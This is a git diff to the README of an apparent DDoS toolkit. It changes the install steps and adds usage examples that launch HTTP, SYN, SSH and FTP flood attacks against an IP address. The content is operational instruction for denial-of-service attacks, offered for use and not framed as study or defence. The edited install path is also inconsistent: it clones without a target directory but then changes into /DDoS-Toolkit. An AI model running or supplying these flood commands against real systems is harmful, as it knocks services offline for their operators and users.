@@ -55,10 +55,10 @@
 ## **🛠️ Installation** 
 ### **Clone the Repository**
 ```bash
-sudo git clone https://github.com/Midohajhouj/DDoS-Toolkit.git /opt/DDoS-Toolkit
+sudo git clone https://github.com/Midohajhouj/DDoS-Toolkit.git 
 ```
 ```bash
-cd /opt/DDoS-Toolkit
+cd /DDoS-Toolkit
 ```
 ```bash
 sudo chmod +x *
@@ -104,14 +104,25 @@ sudo ddos -u 192.168.48.165
 - **`--results`**: Save attack results to JSON (optional).
 
 ### **Examples**
-HTTP flood attack:
+
+Costumizable HTTP flood attack:
 ```bash
 ddos -u 192.168.48.165 -t 20 -p 0.1 -d 300
 ```
 
 SYN flood attack:
 ```bash
-ddos -u 192.168.48.165 --attack-mode syn-flood -d 60
+ddos -u 192.168.48.165 -a syn-flood
+```
+
+SSH flood attack:
+```bash
+ddos -u 192.168.48.165 -a ssh-flood
+```
+
+FTP flood attack:
+```bash
+ddos -u 192.168.48.165 -a ftp-flood
 ```
 
 ---
